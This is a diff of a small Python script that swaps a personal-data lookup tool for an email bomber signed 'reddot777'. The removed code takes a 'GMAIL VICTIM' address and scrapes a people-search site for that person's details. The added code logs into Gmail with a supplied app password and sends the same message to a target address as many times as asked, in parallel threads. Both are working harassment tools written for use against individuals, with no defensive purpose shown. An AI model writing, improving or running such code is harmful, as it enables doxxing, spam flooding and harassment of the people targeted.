@@ -1,72 +1,84 @@
-import requests
+import smtplib
+from email.message import EmailMessage
+from concurrent.futures import ThreadPoolExecutor
 
-from bs4 import BeautifulSoup
+ascii = """
+▓█████   ██████  ██▓███   ▄▄▄       ███▄ ▄███▓
+▓█   ▀ ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒
+▒███   ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░
+▒▓█  ▄   ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██
+░▒████▒▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒
+░░ ▒░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
+ ░ ░  ░░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░
+   ░   ░  ░  ░  ░░         ░   ▒   ░      ░
+   ░  ░      ░                 ░  ░       ░
 
-import json
+made by reddot777
+"""
 
-
-gmail = input("GMAIL VICTIM : ")
-
-url = f"https://thatsthem.com/email/{gmail}"
-
-headers = {
-
-    "Accept": "text/html",
-
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-}
-
-response = requests.get(url, headers=headers)
-
-if response.status_code == 200:
-
-    soup = BeautifulSoup(response.text, 'html.parser')
+print("\n", ascii)
 
 
-    script_tags = soup.find_all('script', type='application/ld+json')
-
-    if script_tags:
-
-        for script_tag in script_tags:
-
-            json_data = script_tag.string
-
-            if json_data:
-
-                try:
-
-                    parsed_data = json.loads(json_data)
+sender_email = input("SENDER EMAIL  --> ")
+app_password = input("APP PASSWORD -->  ")
+target_email = input("TARGET EMAIL --> ")
+subject_email = input("SUBJECT --> ")
+body_email = input("BODY --> ")
+thread = int(input("THREAD -->"))
 
 
-                    if isinstance(parsed_data, list) and all('@type' in item and item['@type'] == 'Person' for item in parsed_data):
+def send_email(to, subject, body):
+    msg = EmailMessage()
+    msg.set_content(body)
+    msg["to"] = to
+    msg["subject"] = subject
+    email = sender_email
+    password = app_password
+    msg["from"] = email
 
-                        for person in parsed_data:
-
-                            if '@id' in person:
-
-                                del person['@id']
-
-                            if 'url' in person:
-
-                                del person['url']
-
-                            if '@context' in person:
-
-                                del person['@context']
+    server = smtplib.SMTP("smtp.gmail.com")
+    server.starttls()
+    server.login(email, password)
+    server.send_message(msg)
+    server.quit()
 
 
-                        print(json.dumps(parsed_data, indent=2))
+if __name__ == "__main__":
+    with ThreadPoolExecutor() as executor:
+        for x in range(thread):
+            executor.submit(send_email, target_email, subject_email, body_email)
+            print(f"{x + 1} EMAIL SENT...")
 
-                        break
 
-                except json.JSONDecodeError as e:
 
-                    print(f"Error decoding JSON: {e}")
-    else:
 
-        print("No <script type='application/ld+json'> tags found.")
-else:
 
-    print(f"Error: Received status code {response.status_code}")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
